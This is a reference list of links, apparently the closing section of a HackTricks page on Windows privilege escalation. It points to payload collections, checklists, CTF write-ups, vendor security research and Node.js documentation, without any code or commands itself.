- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

{{#include ../../banners/hacktricks-training.md}}
